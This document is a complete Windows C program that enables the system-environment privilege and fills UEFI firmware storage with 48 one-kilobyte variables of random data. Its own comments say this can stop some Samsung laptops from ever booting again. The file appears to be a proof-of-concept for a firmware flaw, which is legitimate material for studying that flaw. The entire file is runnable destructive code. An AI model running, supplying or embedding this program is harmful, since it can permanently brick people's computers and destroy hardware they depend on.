#include "stdafx.h"
#include <Windows.h>
#include <WinBase.h>

/* Write 48 UEFI variables of 1K each */
/* The worst case outcome of this should be an error when the firmware runs out of space */
/* However, if run on some Samsung laptops, this will cause the firmware to fail to initialise and prevent the system from ever booting */
int _tmain(int argc, _TCHAR* argv[])
{
		char testdata[1024];
		char name[] = "TestVarXX";
		BOOL result;
		HANDLE handle = NULL;
		TOKEN_PRIVILEGES tp;
 
		ZeroMemory(&tp, sizeof(tp));
 
		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &handle))
				printf("Failed to open process\n");
 
		/* Writing to UEFI variables requires the SE_SYSTEM_ENVIRONMENT_NAME privilege */
		if (!LookupPrivilegeValue(NULL, SE_SYSTEM_ENVIRONMENT_NAME, &tp.Privileges[0].Luid))
				printf("Failed to locate privilege");
 
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if (!AdjustTokenPrivileges(handle, FALSE, &tp, 0, NULL, 0))
				printf("Failed to adjust privileges\n");
 
		for (int i=0; i<48; i++) {
				/* Fill variable with 1K of random data */
				for (int j=0; j<sizeof(testdata); j++)
						testdata[j] = (char)rand();

				/* Generate a unique name */
				sprintf_s(name, sizeof(name), "TestVar%d", i);

				/* Actually write the variable - this calls the SetVariable() UEFI runtime service */     
				result = SetFirmwareEnvironmentVariableExA(name, "{12345678-1234-1234-1234-1234567890ab}", testdata, sizeof(testdata), 0x07);
 
				if (!result) {
						printf("Received error code %ld\n", GetLastError());
						break;
				}
		}
 
		if (result)
						printf("Success");
 
		return 0;
}
